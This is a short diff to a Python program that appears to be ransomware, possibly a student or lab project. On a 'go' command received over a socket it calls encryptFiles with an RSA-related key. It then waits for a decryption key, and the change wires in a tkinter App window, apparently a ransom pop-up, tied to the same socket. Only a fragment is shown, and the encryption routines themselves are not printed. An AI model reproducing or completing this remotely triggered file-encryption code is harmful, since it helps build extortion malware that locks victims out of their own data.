@@ -9,7 +9,7 @@ import sys
 from threading import *
 import uuid
 import time
-#import interface
+from interface import App
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
@@ -170,10 +170,9 @@ if __name__ == "__main__":
                     if data.decode() == 'go':
                         print("encrypting")
                         encryptFiles(key)
-                    # set up thread for tkinter window
-                    #t1 = Thread(target=interface.App().pop_up_win)
-                    #t1.daemon = True
-                    #t1.start()
+                    #set up thread for tkinter window
+                    visual = App(secSock)
+                    visual.start()
 
                     # recv waits for new input of key to decrypt
                     key = secSock.recv(4096)
